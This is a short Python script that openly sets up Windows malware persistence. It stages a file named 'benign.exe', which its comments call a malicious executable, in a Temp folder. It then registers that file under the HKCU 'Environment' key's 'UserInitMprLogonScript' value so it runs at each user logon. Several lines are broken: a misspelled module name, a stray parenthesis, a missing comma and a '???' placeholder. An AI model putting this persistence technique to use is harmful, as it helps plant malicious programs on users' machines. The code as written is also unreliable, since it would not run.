import os, shutil, winreg

filedir = os.path.join(os.getcwd(), "Temp")
filename = "benign.exe"
filepath = os.path.join(filedir, filename)
if os.path.isfile(filepath):
    os.remove(filepath)

# Use buildexe to create malicious executable
os.system("buildExe.py")

# move malicious executable to desired directory
shutil.move(filename,filedir)

# Windows logon script keys 
reghive = wingre.HKEY_CURRENT_USER
regpath = "Environment"

#reghive = winreg.HKEY_USERS
#regpath = ???
print(winreg.HKEY_USERS)
# Add registry logon script
reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg , regpath, 0, access=winreg.KEY_WRITE), filepath)
winreg.SetValueEx(key "UserInitMprLogonScript", 0, winreg.REG_SZ, filepath)
